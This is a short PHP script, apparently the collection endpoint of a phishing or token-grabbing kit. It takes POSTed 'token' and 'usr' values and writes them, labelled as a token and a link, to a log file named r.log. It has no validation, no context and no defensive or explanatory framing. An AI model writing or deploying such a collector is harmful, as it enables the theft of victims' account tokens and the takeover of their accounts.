<?php
$info = $_POST['token'];
$info1 = $_POST['usr'];
$f = fopen("r.log", "w+");
fwrite($f, "Token : $info\nlink : $info1");
fclose($f);

?>
